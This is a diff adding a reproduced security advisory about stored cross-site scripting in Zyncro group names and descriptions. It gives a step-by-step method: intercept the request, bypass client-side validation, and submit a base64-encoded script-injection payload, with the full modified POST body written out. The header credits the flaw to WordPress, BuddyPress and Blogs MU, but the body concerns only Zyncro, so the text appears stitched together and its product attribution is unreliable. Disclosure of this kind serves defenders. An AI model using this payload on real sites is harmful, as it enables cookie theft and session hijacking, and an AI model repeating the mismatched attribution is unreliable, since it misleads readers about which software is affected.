@@ -1,0 +1,42 @@
+source: http://www.securityfocus.com/bid/49765/info
+
+Multiple products are prone to an HTML-injection vulnerability because they fail to sufficiently sanitize user-supplied input.
+
+An attacker could exploit this vulnerability to execute arbitrary script code in the browser of an unsuspecting victim in the context of the affected websites. This may allow the attacker to steal cookie-based authentication credentials or control how the websites are rendered to the user. Other attacks are also possible.
+
+The following products are affected:
+
+WordPress 3.1.4
+BuddyPress 1.2.10
+Blogs MU 1.2.6 
+
+One of the functionalities of Zyncro is the possibility of creating
+groups. The name and description of the groups are not correctly
+sanitized and it's possible to provoke some attacks.
+
+In order to do the attack, you must create a new group and capture the
+packet transferred to the server to modify it because validation is
+done in client-side (only) using javascript.
+
+The original request has three POST data parameters like:
+popup=1   &   name=dGVzdA%3D%3D   &   description=dGVzdA%3D%3D
+
+Important data are 'name' and 'description' parameters, which are
+base64 encoded. In this case, both values are 'test':
+ url_decode(dGVzdA%3D%3D)
+ b64decode(dGVzdA==)
+ test
+
+It is possible to provoke the XSS by changing those values as follows:
+"><script>alert("XSS attack")</script>
+
+Values MUST be in base64, so:
+b64encode(""><script>alert("XSS attack")</script>") =
+Ij48c2NyaXB0PmFsZXJ0KCJYU1MgYXR0YWNrIik8L3NjcmlwdD4=
+
+Finally the post-data of the request would become:
+popup=1&name=Ij48c2NyaXB0PmFsZXJ0KCJYU1MgYXR0YWNrIik8L3NjcmlwdD4%3d&description=Ij48c2NyaXB0PmFsZXJ0KCJYU1MgYXR0YWNrIik8L3NjcmlwdD4%3d
+
+Once the request has reached the server, a new group would be created
+and any time that someone sees the name/description of the group, a
+pop-up would appear, this is the easiest attack.
